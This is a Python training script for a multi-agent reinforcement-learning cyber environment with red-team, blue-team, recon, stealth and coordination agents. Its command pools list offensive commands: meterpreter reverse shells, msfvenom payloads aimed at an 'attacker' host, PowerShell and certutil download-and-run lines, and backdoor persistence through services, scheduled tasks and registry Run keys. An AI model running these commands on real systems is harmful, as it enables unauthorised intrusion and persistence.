#!/usr/bin/env python3
"""
ARIASKA_RL Unified Training System v1.0
🧠 Complete Multi-Agent Training | 📊 Real-Time Analytics | 🎯 Maximum Learning Efficiency

Features:
- All 5 agents (Red, Blue, Scout, Shadow, Orion) with full coordination
- DQN learning with prioritized experience replay
- Memory router with cross-agent insights
- Real-time UX-friendly dashboard
- Complete command tracking and output analysis
- Neural network optimization and statistics
- CLI integration support
- Progressive curriculum learning
"""

import sys
import os
import time
import json
import random
import logging
import numpy as np
import torch
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from collections import deque, defaultdict

# Rich UI components
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
from rich.columns import Columns
from rich.text import Text
from rich import box

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

# Import all agents and core systems
from core.agents.red_agent import RedAgent
from core.agents.blue_agent import BlueAgent
from core.agents.scout_agent import ScoutAgent
from core.agents.shadow_agent import ShadowAgent
from core.agents.orion_agent import OrionAgent
from core.environment.cyber_environment import CyberEnvironment
from core.multiagent.memory_router import MemoryRouter

console = Console()

class UnifiedTrainingSystem:
    """
    Unified training system that combines all ARIASKA_RL capabilities.
    
    This is the single entry point for all training operations, designed to:
    - Train all 5 agents simultaneously with coordination
    - Provide real-time, user-friendly visualization
    - Track every command, output, target, and learning metric
    - Optimize memory usage and DQN learning
    - Support both CLI and direct execution
    """
    
    def __init__(
        self,
        episodes: int = 100,
        max_steps_per_episode: int = 50,
        save_interval: int = 10,
        log_dir: str = "logs/unified_training",
        model_dir: str = "models/unified",
        session_id: Optional[str] = None
    ):
        # Core configuration
        self.episodes = episodes
        self.max_steps_per_episode = max_steps_per_episode
        self.save_interval = save_interval
        self.log_dir = Path(log_dir)
        self.model_dir = Path(model_dir)
        self.session_id = session_id or f"unified_{int(time.time())}"
        
        # Create directories
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.model_dir.mkdir(parents=True, exist_ok=True)
        
        # Set up logging
        self._setup_logging()
        
        # Initialize core systems
        self.memory_router = MemoryRouter(buffer_size=20000, enable_sqlite=True)
        self.environment = CyberEnvironment(defer_reset=False)
        self.agents = {}
        
        # Training metrics and state
        self.training_metrics = {
            'episode_rewards': defaultdict(list),
            'episode_steps': defaultdict(list),
            'commands_executed': defaultdict(list),
            'command_outputs': defaultdict(list),
            'targets_engaged': defaultdict(list),
            'neural_losses': defaultdict(list),
            'epsilon_values': defaultdict(list),
            'memory_usage': defaultdict(list),
            'coordination_scores': [],
            'phase_transitions': [],
            'gpt_usage': defaultdict(int),
            'learning_rates': defaultdict(list)
        }
        
        # Current episode state
        self.current_episode = 0
        self.current_step = 0
        self.episode_start_time = 0
        self.total_training_time = 0
        
        # Coordination matrix for multi-agent learning
        self.coordination_matrix = np.zeros((5, 5))
        self.agent_names = ['RedAgent', 'BlueAgent', 'ScoutAgent', 'ShadowAgent', 'OrionAgent']
        self.agent_roles = {
            'RedAgent': 'Offensive Penetration Testing',
            'BlueAgent': 'Defensive Monitoring & Response', 
            'ScoutAgent': 'Reconnaissance & Intelligence',
            'ShadowAgent': 'Stealth Operations & Evasion',
            'OrionAgent': 'Strategic Coordination & Oversight'
        }
        
        # Command pools for diverse training
        self.command_pools = self._initialize_command_pools()
        
        # Learning curve tracking
        self.learning_curves = {
            'reward_history': deque(maxlen=1000),
            'loss_history': deque(maxlen=1000),
            'epsilon_history': deque(maxlen=1000),
            'coordination_history': deque(maxlen=1000)
        }
        
        # Real-time dashboard state
        self.dashboard_update_interval = 2.0  # seconds
        self.last_dashboard_update = 0
        
        console.print(Panel(
            f"[bold green]🚀 ARIASKA_RL Unified Training System Initialized[/bold green]\n"
            f"📊 Episodes: {episodes} | Max Steps: {max_steps_per_episode}\n"
            f"🆔 Session ID: {self.session_id}\n"
            f"📁 Logs: {self.log_dir}\n"
            f"💾 Models: {self.model_dir}",
            title="Training System Ready",
            border_style="cyan"
        ))
    
    def _setup_logging(self):
        """Setup comprehensive logging system."""
        log_file = self.log_dir / f"unified_training_{self.session_id}.log"
        
        # Create formatter without Unicode characters
        formatter = logging.Formatter('%(asctime)s | %(levelname)s | %(name)s | %(message)s')
        
        # File handler with UTF-8 encoding
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setFormatter(formatter)
        
        # Console handler with safe encoding
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        
        # Configure logger
        self.logger = logging.getLogger("UnifiedTraining")
        self.logger.setLevel(logging.INFO)
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)
        
        self.logger.info(f"Training session {self.session_id} initialized")
    
    def _initialize_command_pools(self) -> Dict[str, List[str]]:
        """Initialize diverse command pools for realistic training scenarios."""
        return {
            'recon': [
                'nmap -sS -p 22,80,443,8080 {target}',
                'nmap -sU -p 53,161,162 {target}',
                'nmap -sV -p 1-1000 {target}',
                'masscan -p1-65535 {target} --rate=1000',
                'rustscan -a {target} --top',
                'ping -c 4 {target}',
                'traceroute {target}',
                'dig @{target} ANY',
                'whois {target}',
                'amass enum -d {target}'
            ],
            'enumeration': [
                'dirb http://{target}/',
                'gobuster dir -u http://{target} -w /usr/share/wordlists/common.txt',
                'nikto -h http://{target}',
                'enum4linux {target}',
                'smbclient -L {target} -N',
                'rpcinfo -p {target}',
                'showmount -e {target}',
                'snmpwalk -v2c -c public {target}',
                'dnsrecon -d {target}',
                'fierce -dns {target}'
            ],
            'exploitation': [
                'msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp"',
                'sqlmap -u "http://{target}/login.php" --dbs',
                'hydra -l admin -P wordlist.txt ssh://{target}',
                'john --wordlist=rockyou.txt hashes.txt',
                'hashcat -m 1000 hashes.txt wordlist.txt',
                'nc -lvp 4444',
                'searchsploit apache 2.4',
                'metasploit-framework',
                'burpsuite --project-file={target}.burp',
                'wpscan --url http://{target} --enumerate p'
            ],
            'persistence': [
                'crontab -e',
                'systemctl create backdoor.service',
                'echo "payload" >> ~/.bashrc',
                'ssh-keygen -t rsa -b 4096',
                'msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe',
                'powershell -ep bypass -c "iex(new-object net.webclient).downloadstring()"',
                'certutil -urlcache -split -f http://attacker/payload.exe',
                'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                'at 14:00 /every:M,T,W,Th,F cmd.exe',
                'schtasks /create /tn "backdoor" /tr "C:\\backdoor.exe"'
            ],
            'defense': [
                'netstat -tulpn | grep LISTEN',
                'iptables -L -n',
                'fail2ban-client status',
                'chkrootkit',
                'rkhunter --check',
                'lynis audit system',
                'ossec-control start',
                'systemctl status firewalld',
                'journalctl -f',
                'auditctl -l'
            ]
        }
    
    def setup_agents(self) -> bool:
        """Initialize all agents with enhanced capabilities."""
        console.print("[bold cyan]🤖 Initializing Advanced Multi-Agent System...[/bold cyan]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn(),
            console=console,
        ) as progress:
            
            task = progress.add_task("Setting up agents...", total=5)
            
            try:
                # Red Agent - Offensive Operations
                progress.update(task, description="Creating RedAgent (Offensive)...")
                self.agents['RedAgent'] = RedAgent(
                    agent_id=f"RedAgent_{self.session_id}",
                    memory_router=self.memory_router
                )
                progress.advance(task)
                
                # Blue Agent - Defensive Operations  
                progress.update(task, description="Creating BlueAgent (Defensive)...")
                self.agents['BlueAgent'] = BlueAgent(
                    agent_id=f"BlueAgent_{self.session_id}",
                    memory_router=self.memory_router
                )
                progress.advance(task)
                
                # Scout Agent - Reconnaissance
                progress.update(task, description="Creating ScoutAgent (Reconnaissance)...")
                self.agents['ScoutAgent'] = ScoutAgent(
                    agent_id=f"ScoutAgent_{self.session_id}",
                    memory_router=self.memory_router
                )
                progress.advance(task)
                
                # Shadow Agent - Stealth Operations
                progress.update(task, description="Creating ShadowAgent (Stealth)...")
                self.agents['ShadowAgent'] = ShadowAgent(
                    agent_id=f"ShadowAgent_{self.session_id}",
                    memory_router=self.memory_router
                )
                progress.advance(task)
                
                # Orion Agent - Strategic Coordination
                progress.update(task, description="Creating OrionAgent (Strategic)...")
                self.agents['OrionAgent'] = OrionAgent(
                    agent_id=f"OrionAgent_{self.session_id}",
                    memory_router=self.memory_router
                )
                progress.advance(task)
                
                # Verify all agents are properly initialized
                for agent_name, agent in self.agents.items():
                    if not hasattr(agent, 'act'):
                        raise ValueError(f"{agent_name} missing act method")
                
                console.print(f"[green]✅ Successfully initialized {len(self.agents)} agents[/green]")
                self.logger.info(f"All agents initialized successfully for session {self.session_id}")
                return True
                
            except Exception as e:
                console.print(f"[red]❌ Error initializing agents: {e}[/red]")
                self.logger.error(f"Agent initialization failed: {e}")
                return False
    
    def run_training(self) -> Dict[str, Any]:
        """
        Main training loop with real-time dashboard and comprehensive metrics.
        """
        if not self.setup_agents():
            raise RuntimeError("Failed to initialize agents")
        
        # Training results
        results = {
            'session_id': self.session_id,
            'episodes_completed': 0,
            'total_training_time': 0,
            'agent_performance': {},
            'coordination_metrics': {},
            'learning_analytics': {},
            'final_metrics': {}
        }
        
        console.print(Panel(
            f"[bold blue]🎯 Starting Unified Training Session[/bold blue]\n"
            f"Episodes: {self.episodes} | Max Steps: {self.max_steps_per_episode}\n"
            f"Agents: {len(self.agents)} | Memory: Enhanced Prioritized Replay\n"
            f"Neural: DQN with Double Q-Learning | Coordination: Multi-Agent Matrix",
            title="Training Initiation",
            border_style="green"
        ))
        
        training_start_time = time.time()
        
        # Main training loop with live dashboard
        with Live(self._create_training_dashboard(), refresh_per_second=0.5, console=console) as live:
            
            for episode in range(self.episodes):
                self.current_episode = episode
                self.episode_start_time = time.time()
                
                # Run episode
                episode_results = self._run_episode(episode)
                
                # Update metrics
                self._update_training_metrics(episode_results)
                
                # Update coordination matrix
                self._update_coordination_matrix(episode_results)
                
                # Update dashboard
                if time.time() - self.last_dashboard_update > self.dashboard_update_interval:
                    live.update(self._create_training_dashboard())
                    self.last_dashboard_update = time.time()
                
                # Save checkpoints
                if (episode + 1) % self.save_interval == 0:
                    self._save_checkpoint(episode)
                
                # Log episode completion
                episode_duration = time.time() - self.episode_start_time
                self.logger.info(
                    f"Episode {episode + 1}/{self.episodes} completed in {episode_duration:.2f}s"
                )
                
                # Early stopping if all agents converged
                if self._check_convergence():
                    console.print(f"[green]🎯 Early convergence achieved at episode {episode + 1}[/green]")
                    break
        
        # Training completion
        self.total_training_time = time.time() - training_start_time
        results['episodes_completed'] = self.current_episode + 1
        results['total_training_time'] = self.total_training_time
        
        # Generate final analytics
        results.update(self._generate_final_analytics())
        
        # Save final results
        self._save_final_results(results)
        
        console.print(Panel(
            f"[bold green]✅ Training Complete![/bold green]\n"
            f"Episodes: {results['episodes_completed']}/{self.episodes}\n"
            f"Duration: {self.total_training_time:.2f} seconds\n"
            f"Average Reward: {results['final_metrics'].get('avg_reward', 0):.2f}\n"
            f"Coordination Score: {results['final_metrics'].get('coordination_score', 0):.2f}",
            title="Training Results",
            border_style="green"
        ))
        
        return results
    
    def _run_episode(self, episode: int) -> Dict[str, Any]:
        """Run a single training episode with all agents."""
        episode_results = {
            'episode': episode,
            'agent_actions': defaultdict(list),
            'agent_rewards': defaultdict(float),
            'agent_outputs': defaultdict(list),
            'targets': defaultdict(list),
            'coordination_events': [],
            'phase_transitions': [],
            'neural_updates': defaultdict(list)
        }
        
        # Reset environment
        state = self.environment.reset()
        current_phase = state.get('phase', 'reconnaissance')
        target = state.get('target', '10.10.10.10')
        
        for step in range(self.max_steps_per_episode):
            self.current_step = step
            step_start_time = time.time()
            
            # Get actions from all agents
            agent_actions = {}
            for agent_name, agent in self.agents.items():
                try:
                    # Prepare agent-specific state
                    agent_state = self._prepare_agent_state(state, agent_name, step)
                    
                    # Get action from agent
                    action_result = agent.act(agent_state)
                    
                    # Handle different return types from act method
                    if isinstance(action_result, tuple):
                        # Handle tuple return (command, success, reward, info)
                        if len(action_result) >= 4:
                            command, success, reward, info = action_result[:4]
                            action_result = {
                                'command': command,
                                'success': success,
                                'reward': reward,
                                'info': info
                            }
                        else:
                            # Fallback for incomplete tuple
                            command = action_result[0] if action_result else 'echo "No action"'
                            action_result = {
                                'command': command,
                                'success': True,
                                'reward': 0.0,
                                'info': {}
                            }
                    elif not isinstance(action_result, dict):
                        # Handle other return types
                        action_result = {
                            'command': str(action_result) if action_result else 'echo "No action"',
                            'success': True,
                            'reward': 0.0,
                            'info': {}
                        }
                    
                    agent_actions[agent_name] = action_result
                    
                    # Track action details
                    if isinstance(action_result, dict):
                        command = action_result.get('command', 'unknown')
                        episode_results['agent_actions'][agent_name].append(command)
                        episode_results['targets'][agent_name].append(target)
                        
                        # Execute command in environment
                        env_result = self.environment.step(command)
                        output = env_result.get('output', '')
                        episode_results['agent_outputs'][agent_name].append(output)
                        
                        # Calculate reward
                        reward = self._calculate_reward(agent_name, action_result, env_result, current_phase)
                        episode_results['agent_rewards'][agent_name] += reward
                        
                        # Update agent with reward and next state
                        next_state = self._update_state(state, env_result, agent_name)
                        
                        # Train agent if it has learning capability
                        if hasattr(agent, 'learn'):
                            loss = agent.learn(agent_state, action_result, reward, next_state, False)
                            if loss is not None:
                                episode_results['neural_updates'][agent_name].append(float(loss))
                        
                        # Store experience in memory router
                        self.memory_router.add_transition(
                            agent_id=agent_name,
                            state=agent_state,
                            action=command,
                            reward=reward,
                            next_state=next_state,
                            done=False,
                            gpt_tokens=action_result.get('gpt_tokens', 0),
                            metadata={
                                'phase': current_phase,
                                'target': target,
                                'step': step,
                                'episode': episode,
                                'output_length': len(output),
                                'command_type': self._classify_command(command)
                            },
                            phase=current_phase,
                            episode_id=f"ep_{episode}"
                        )
                    
                except Exception as e:
                    self.logger.error(f"Error in {agent_name} action: {e}")
                    episode_results['agent_actions'][agent_name].append('error')
                    episode_results['agent_rewards'][agent_name] += -1.0
            
            # Update coordination matrix based on agent interactions
            self._update_step_coordination(agent_actions, episode_results)
            
            # Check for phase transitions
            new_phase = self._check_phase_transition(state, agent_actions, step)
            if new_phase != current_phase:
                episode_results['phase_transitions'].append({
                    'step': step,
                    'from_phase': current_phase,
                    'to_phase': new_phase
                })
                current_phase = new_phase
            
            # Update state
            state = self._update_global_state(state, agent_actions, step)
            
            # Step timing
            step_duration = time.time() - step_start_time
            if step_duration > 2.0:  # Log slow steps
                self.logger.warning(f"Slow step {step} in episode {episode}: {step_duration:.2f}s")
        
        return episode_results
    
    def _prepare_agent_state(self, global_state: Dict[str, Any], agent_name: str, step: int) -> Dict[str, Any]:
        """Prepare agent-specific state information."""
        base_state = global_state.copy()
        
        # Add agent-specific context
        base_state.update({
            'agent_id': agent_name,
            'agent_role': self.agent_roles[agent_name],
            'step': step,
            'episode': self.current_episode,
            'coordination_score': self.coordination_matrix[self.agent_names.index(agent_name)].mean(),
            'memory_size': len(self.memory_router.get_recent_transitions(agent_name, limit=100))
        })
        
        # Add recent memory context
        recent_transitions = self.memory_router.get_recent_transitions(agent_name, limit=5)
        base_state['recent_actions'] = [t.action for t in recent_transitions]
        base_state['recent_rewards'] = [t.reward for t in recent_transitions]
        
        return base_state
    
    def _calculate_reward(self, agent_name: str, action_result: Dict[str, Any], 
                         env_result: Dict[str, Any], phase: str) -> float:
        """Calculate sophisticated reward based on agent role and action effectiveness."""
        base_reward = 0.0
        
        # Extract relevant information
        command = action_result.get('command', '')
        output = env_result.get('output', '')
        success = env_result.get('success', False)
        
        # Base success reward
        if success:
            base_reward += 1.0
        
        # Agent-specific reward calculation
        if agent_name == 'RedAgent':
            # Reward for successful exploits and discoveries
            if 'exploit' in command.lower() or 'payload' in output.lower():
                base_reward += 2.0
            if 'open' in output.lower() or 'vulnerable' in output.lower():
                base_reward += 1.5
            if 'access denied' in output.lower() or 'failed' in output.lower():
                base_reward -= 0.5
        
        elif agent_name == 'BlueAgent':
            # Reward for defensive actions and threat detection
            if 'monitor' in command.lower() or 'detect' in command.lower():
                base_reward += 1.0
            if 'blocked' in output.lower() or 'prevented' in output.lower():
                base_reward += 2.0
            if 'alert' in output.lower():
                base_reward += 0.5
        
        elif agent_name == 'ScoutAgent':
            # Reward for reconnaissance and information gathering
            if 'scan' in command.lower() or 'enum' in command.lower():
                base_reward += 1.0
            if len(output) > 100:  # Detailed output
                base_reward += 0.5
            if 'service' in output.lower() or 'port' in output.lower():
                base_reward += 1.0
        
        elif agent_name == 'ShadowAgent':
            # Reward for stealth and evasion
            if 'stealth' in command.lower() or 'evade' in command.lower():
                base_reward += 1.5
            if 'undetected' in output.lower():
                base_reward += 2.0
            if 'detected' in output.lower():
                base_reward -= 1.0
        
        elif agent_name == 'OrionAgent':
            # Reward for strategic coordination
            if 'coordinate' in command.lower() or 'strategy' in command.lower():
                base_reward += 1.0
            # Bonus for successful multi-agent coordination
            coordination_score = self.coordination_matrix[self.agent_names.index(agent_name)].mean()
            base_reward += coordination_score * 0.5
        
        # Phase-specific bonuses
        phase_bonus = {
            'reconnaissance': 0.2 if agent_name in ['ScoutAgent', 'RedAgent'] else 0.0,
            'enumeration': 0.2 if agent_name in ['RedAgent', 'ScoutAgent'] else 0.0,
            'exploitation': 0.3 if agent_name == 'RedAgent' else 0.0,
            'persistence': 0.2 if agent_name in ['RedAgent', 'ShadowAgent'] else 0.0,
            'defense': 0.3 if agent_name == 'BlueAgent' else 0.0
        }.get(phase, 0.0)
        
        base_reward += phase_bonus
        
        # Command diversity bonus
        recent_commands = self.training_metrics['commands_executed'][agent_name][-10:]
        if command not in recent_commands:
            base_reward += 0.1  # Encourage exploration
        
        return np.clip(base_reward, -2.0, 5.0)  # Clamp rewards
    
    def _update_state(self, current_state: Dict[str, Any], env_result: Dict[str, Any], 
                     agent_name: str) -> Dict[str, Any]:
        """Update environment state based on agent action results."""
        next_state = current_state.copy()
        
        # Update based on environment result
        next_state.update({
            'last_action': env_result.get('command', ''),
            'last_output': env_result.get('output', ''),
            'last_agent': agent_name,
            'step': self.current_step + 1,
            'timestamp': time.time()
        })
        
        # Update discovered services/hosts based on output
        output = env_result.get('output', '').lower()
        if 'open' in output and 'port' in output:
            if 'discovered_ports' not in next_state:
                next_state['discovered_ports'] = []
            # Simple port extraction logic
            import re
            ports = re.findall(r'(\d+)/tcp\s+open', output)
            next_state['discovered_ports'].extend(ports)
        
        return next_state
    
    def _check_phase_transition(self, state: Dict[str, Any], agent_actions: Dict[str, Any], 
                               step: int) -> str:
        """Determine if phase should transition based on agent actions and progress."""
        current_phase = state.get('phase', 'reconnaissance')
        
        # Count action types in this step
        action_types = defaultdict(int)
        for agent_name, action_result in agent_actions.items():
            if isinstance(action_result, dict):
                command = action_result.get('command', '').lower()
                action_types[self._classify_command(command)] += 1
        
        # Phase transition logic
        if current_phase == 'reconnaissance':
            if action_types['enumeration'] >= 2 or step > 10:
                return 'enumeration'
        elif current_phase == 'enumeration':
            if action_types['exploitation'] >= 1 or step > 20:
                return 'exploitation'
        elif current_phase == 'exploitation':
            if action_types['persistence'] >= 1 or step > 35:
                return 'persistence'
        elif current_phase == 'persistence':
            if action_types['defense'] >= 1 or step > 45:
                return 'defense'
        
        return current_phase
    
    def _classify_command(self, command: str) -> str:
        """Classify command type for phase transition logic."""
        command_lower = command.lower()
        
        if any(word in command_lower for word in ['nmap', 'scan', 'ping', 'traceroute']):
            return 'reconnaissance'
        elif any(word in command_lower for word in ['enum', 'dirb', 'gobuster', 'smbclient']):
            return 'enumeration'
        elif any(word in command_lower for word in ['exploit', 'msf', 'payload', 'shell']):
            return 'exploitation'
        elif any(word in command_lower for word in ['cron', 'service', 'registry', 'startup']):
            return 'persistence'
        elif any(word in command_lower for word in ['iptables', 'firewall', 'block', 'monitor']):
            return 'defense'
        else:
            return 'other'
    
    def _update_step_coordination(self, agent_actions: Dict[str, Any], 
                                 episode_results: Dict[str, Any]):
        """Update coordination matrix based on agent interactions in this step."""
        # Simple coordination scoring based on complementary actions
        agent_indices = {name: i for i, name in enumerate(self.agent_names)}
        
        for i, agent1 in enumerate(self.agent_names):
            for j, agent2 in enumerate(self.agent_names):
                if i != j and agent1 in agent_actions and agent2 in agent_actions:
                    # Calculate coordination score based on action complementarity
                    action1 = agent_actions[agent1].get('command', '') if isinstance(agent_actions[agent1], dict) else ''
                    action2 = agent_actions[agent2].get('command', '') if isinstance(agent_actions[agent2], dict) else ''
                    
                    coordination_score = self._calculate_coordination_score(action1, action2, agent1, agent2)
                    
                    # Update coordination matrix with exponential moving average
                    alpha = 0.1
                    self.coordination_matrix[i][j] = (1 - alpha) * self.coordination_matrix[i][j] + alpha * coordination_score
    
    def _calculate_coordination_score(self, action1: str, action2: str, agent1: str, agent2: str) -> float:
        """Calculate coordination score between two agent actions."""
        # Define complementary action pairs
        coordination_patterns = {
            ('ScoutAgent', 'RedAgent'): ['scan', 'exploit'],
            ('RedAgent', 'ShadowAgent'): ['exploit', 'stealth'],
            ('BlueAgent', 'OrionAgent'): ['monitor', 'coordinate'],
            ('ShadowAgent', 'OrionAgent'): ['stealth', 'strategy']
        }
        
        action1_lower = action1.lower()
        action2_lower = action2.lower()
        
        # Check for coordination patterns
        for (a1, a2), patterns in coordination_patterns.items():
            if (agent1 == a1 and agent2 == a2) or (agent1 == a2 and agent2 == a1):
                if any(p in action1_lower for p in patterns) and any(p in action2_lower for p in patterns):
                    return 1.0
        
        # Check for conflicting actions (negative coordination)
        if 'stealth' in action1_lower and 'scan' in action2_lower:
            return -0.5  # Scanning while being stealthy is conflicting
        
        return 0.0  # Neutral coordination
    
    def _update_global_state(self, state: Dict[str, Any], agent_actions: Dict[str, Any], 
                           step: int) -> Dict[str, Any]:
        """Update global environment state based on all agent actions."""
        next_state = state.copy()
        next_state['step'] = step + 1
        
        # Aggregate discoveries from all agents
        all_discoveries = []
        for agent_name, action_result in agent_actions.items():
            if isinstance(action_result, dict) and 'discoveries' in action_result:
                all_discoveries.extend(action_result['discoveries'])
        
        if all_discoveries:
            next_state['global_discoveries'] = all_discoveries
        
        # Update threat level based on actions
        threat_indicators = ['exploit', 'payload', 'shell', 'backdoor']
        threat_level = sum(1 for action in agent_actions.values() 
                          if isinstance(action, dict) and 
                          any(indicator in action.get('command', '').lower() 
                              for indicator in threat_indicators))
        
        next_state['threat_level'] = threat_level
        
        return next_state
    
    def _update_training_metrics(self, episode_results: Dict[str, Any]):
        """Update comprehensive training metrics."""
        episode = episode_results['episode']
        
        # Update per-agent metrics
        for agent_name in self.agent_names:
            agent_reward = episode_results['agent_rewards'][agent_name]
            agent_actions = episode_results['agent_actions'][agent_name]
            agent_outputs = episode_results['agent_outputs'][agent_name]
            
            self.training_metrics['episode_rewards'][agent_name].append(agent_reward)
            self.training_metrics['episode_steps'][agent_name].append(len(agent_actions))
            self.training_metrics['commands_executed'][agent_name].extend(agent_actions)
            self.training_metrics['command_outputs'][agent_name].extend(agent_outputs)
            
            # Update neural network metrics
            if agent_name in episode_results['neural_updates']:
                losses = episode_results['neural_updates'][agent_name]
                if losses:
                    self.training_metrics['neural_losses'][agent_name].extend(losses)
            
            # Update exploration metrics (epsilon values)
            agent = self.agents.get(agent_name)
            if agent and hasattr(agent, 'epsilon'):
                self.training_metrics['epsilon_values'][agent_name].append(agent.epsilon)
            
            # Update memory usage
            memory_size = len(self.memory_router.get_recent_transitions(agent_name, limit=1000))
            self.training_metrics['memory_usage'][agent_name].append(memory_size)
        
        # Update coordination metrics
        avg_coordination = self.coordination_matrix.mean()
        self.training_metrics['coordination_scores'].append(avg_coordination)
        
        # Update learning curves
        total_reward = sum(episode_results['agent_rewards'].values())
        self.learning_curves['reward_history'].append(total_reward)
        
        avg_loss = np.mean([loss for losses in episode_results['neural_updates'].values() 
                           for loss in losses]) if episode_results['neural_updates'] else 0.0
        self.learning_curves['loss_history'].append(avg_loss)
        
        self.learning_curves['coordination_history'].append(avg_coordination)
        
        # Update phase transitions
        self.training_metrics['phase_transitions'].extend(episode_results['phase_transitions'])
    
    def _update_coordination_matrix(self, episode_results: Dict[str, Any]):
        """Update long-term coordination matrix based on episode results."""
        # This is already handled in _update_step_coordination, but we can add
        # episode-level coordination metrics here if needed
        pass
    
    def _create_training_dashboard(self) -> Layout:
        """Create comprehensive real-time training dashboard."""
        layout = Layout()
        
        # Split into header and main content
        layout.split_column(
            Layout(name="header", size=7),
            Layout(name="main"),
            Layout(name="footer", size=5)
        )
        
        # Header with training overview
        layout["header"].update(self._create_header_panel())
        
        # Main content split into left and right
        layout["main"].split_row(
            Layout(name="left"),
            Layout(name="right")
        )
        
        # Left side: Agent metrics and coordination
        layout["left"].split_column(
            Layout(name="agents", ratio=2),
            Layout(name="coordination", ratio=1)
        )
        
        # Right side: Learning curves and current state
        layout["right"].split_column(
            Layout(name="learning", ratio=2),
            Layout(name="current", ratio=1)
        )
        
        # Fill each section
        layout["agents"].update(self._create_agent_metrics_panel())
        layout["coordination"].update(self._create_coordination_panel())
        layout["learning"].update(self._create_learning_curves_panel())
        layout["current"].update(self._create_current_state_panel())
        layout["footer"].update(self._create_footer_panel())
        
        return layout
    
    def _create_header_panel(self) -> Panel:
        """Create header panel with training overview."""
        # Calculate progress
        progress_pct = (self.current_episode / self.episodes * 100) if self.episodes > 0 else 0
        elapsed_time = time.time() - (self.episode_start_time or time.time())
        
        # Calculate ETA
        if self.current_episode > 0:
            avg_episode_time = self.total_training_time / self.current_episode
            remaining_episodes = self.episodes - self.current_episode
            eta_seconds = remaining_episodes * avg_episode_time
            eta_str = f"{eta_seconds / 60:.1f}m" if eta_seconds > 60 else f"{eta_seconds:.0f}s"
        else:
            eta_str = "Calculating..."
        
        header_content = f"""[bold cyan]ARIASKA_RL Unified Training System[/bold cyan]
[white]Session: {self.session_id}[/white] | [green]Episode: {self.current_episode + 1}/{self.episodes}[/green] | [yellow]Step: {self.current_step + 1}/{self.max_steps_per_episode}[/yellow]
[blue]Progress: {progress_pct:.1f}%[/blue] | [magenta]ETA: {eta_str}[/magenta] | [red]Elapsed: {elapsed_time:.1f}s[/red]
[dim]GPU: {'✅' if torch.cuda.is_available() else '❌'} | Memory Router: ✅ | Agents: {len(self.agents)}[/dim]"""
        
        return Panel(
            header_content,
            title="🧠 Training Dashboard",
            border_style="cyan",
            padding=(1, 2)
        )
    
    def _create_agent_metrics_panel(self) -> Panel:
        """Create agent performance metrics panel."""
        table = Table(show_header=True, header_style="bold magenta", box=box.ROUNDED)
        table.add_column("Agent", style="cyan", width=12)
        table.add_column("Role", style="white", width=20)
        table.add_column("Reward", style="green", justify="right", width=8)
        table.add_column("Commands", style="yellow", justify="right", width=8)
        table.add_column("ε (Exploration)", style="blue", justify="right", width=12)
        table.add_column("Loss", style="red", justify="right", width=8)
        table.add_column("Memory", style="magenta", justify="right", width=8)
        
        for agent_name in self.agent_names:
            # Calculate metrics
            rewards = self.training_metrics['episode_rewards'][agent_name]
            avg_reward = np.mean(rewards[-10:]) if rewards else 0.0
            
            total_commands = len(self.training_metrics['commands_executed'][agent_name])
            
            epsilon_values = self.training_metrics['epsilon_values'][agent_name]
            current_epsilon = epsilon_values[-1] if epsilon_values else 0.0
            
            losses = self.training_metrics['neural_losses'][agent_name]
            avg_loss = np.mean(losses[-5:]) if losses else 0.0
            
            memory_sizes = self.training_metrics['memory_usage'][agent_name]
            current_memory = memory_sizes[-1] if memory_sizes else 0
            
            # Color coding based on performance
            reward_color = "green" if avg_reward > 1.0 else "yellow" if avg_reward > 0 else "red"
            epsilon_color = "blue" if current_epsilon > 0.1 else "dim"
            
            table.add_row(
                agent_name,
                self.agent_roles[agent_name][:18] + "..." if len(self.agent_roles[agent_name]) > 18 else self.agent_roles[agent_name],
                f"[{reward_color}]{avg_reward:.2f}[/{reward_color}]",
                str(total_commands),
                f"[{epsilon_color}]{current_epsilon:.3f}[/{epsilon_color}]",
                f"{avg_loss:.4f}" if avg_loss > 0 else "N/A",
                str(current_memory)
            )
        
        return Panel(
            table,
            title="🤖 Agent Performance Metrics",
            border_style="green",
            padding=(0, 1)
        )
    
    def _create_coordination_panel(self) -> Panel:
        """Create agent coordination matrix panel."""
        # Create coordination visualization
        coord_content = "[bold]Agent Coordination Matrix[/bold]\n\n"
        
        # Simple text-based matrix display
        for i, agent1 in enumerate(self.agent_names):
            coord_content += f"{agent1[:6]:>6}: "
            for j, agent2 in enumerate(self.agent_names):
                if i == j:
                    coord_content += "  ■  "  # Self
                else:
                    score = self.coordination_matrix[i][j]
                    if score > 0.5:
                        coord_content += f"[green]{score:.1f}[/green] "
                    elif score > 0.0:
                        coord_content += f"[yellow]{score:.1f}[/yellow] "
                    elif score < 0.0:
                        coord_content += f"[red]{score:.1f}[/red] "
                    else:
                        coord_content += f"[dim]{score:.1f}[/dim] "
            coord_content += "\n"
        
        # Add coordination statistics
        avg_coordination = self.coordination_matrix.mean()
        max_coordination = self.coordination_matrix.max()
        coord_content += f"\n[cyan]Avg: {avg_coordination:.2f}[/cyan] | [green]Max: {max_coordination:.2f}[/green]"
        
        return Panel(
            coord_content,
            title="🔗 Multi-Agent Coordination",
            border_style="yellow",
            padding=(1, 1)
        )
    
    def _create_learning_curves_panel(self) -> Panel:
        """Create learning curves visualization panel."""
        curves_content = "[bold]Learning Analytics[/bold]\n\n"
        
        # Reward trend (last 20 episodes)
        recent_rewards = list(self.learning_curves['reward_history'])[-20:]
        if len(recent_rewards) >= 2:
            trend = "↗️" if recent_rewards[-1] > recent_rewards[-5] else "↘️" if recent_rewards[-1] < recent_rewards[-5] else "➡️"
